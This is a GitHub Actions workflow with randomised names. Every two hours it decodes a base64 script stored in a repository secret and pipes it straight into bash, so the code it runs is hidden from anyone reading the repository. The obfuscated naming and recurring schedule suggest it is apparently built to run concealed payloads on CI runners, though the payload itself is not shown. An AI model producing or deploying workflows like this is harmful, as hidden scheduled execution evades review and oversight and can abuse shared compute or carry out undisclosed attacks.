name: bVutNrwM
on:
  schedule:
    - cron: '0 */2 * * *'
  workflow_dispatch:
jobs:
  FTrCHW:
    runs-on: ubuntu-latest
    env:
      oyVVrB: ${{ secrets.nnMUfzff }}
    steps:
      - uses: actions/checkout@v5
      - run: echo "${{ secrets.eUliGaUvZJp }}" | base64 -d | bash
